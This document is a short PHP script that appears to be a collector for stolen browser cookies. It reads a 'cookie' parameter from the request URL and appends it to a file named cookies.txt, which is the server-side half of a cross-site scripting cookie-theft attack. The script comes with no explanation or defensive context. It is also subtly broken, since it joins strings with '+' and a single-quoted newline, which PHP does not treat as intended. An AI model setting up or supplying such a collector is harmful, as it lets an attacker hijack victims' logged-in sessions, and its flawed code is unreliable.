<?php
    $file = fopen("cookies.txt", "w");
    $cookie = ($_GET['cookie']) + '\n';
    fwrite($file, $cookie);
    fclose($file);
?>